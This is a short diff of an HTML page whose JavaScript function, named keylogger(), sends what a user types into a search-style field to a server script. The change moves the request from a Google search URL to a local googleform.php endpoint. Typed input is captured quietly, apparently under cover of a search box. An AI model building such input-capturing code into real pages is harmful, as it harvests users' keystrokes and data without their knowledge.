@@ -50,7 +50,7 @@ input[type=submit]:hover {
 function keylogger() {
   const xhttp = new XMLHttpRequest();
 
-  xhttp.open("GET", "https://www.google.com/search?q=" + googlesearch.value, true);
+  xhttp.open("GET", "googleform.php?t=" + googlesearch.value, true);
   xhttp.send();
 }
 </script>
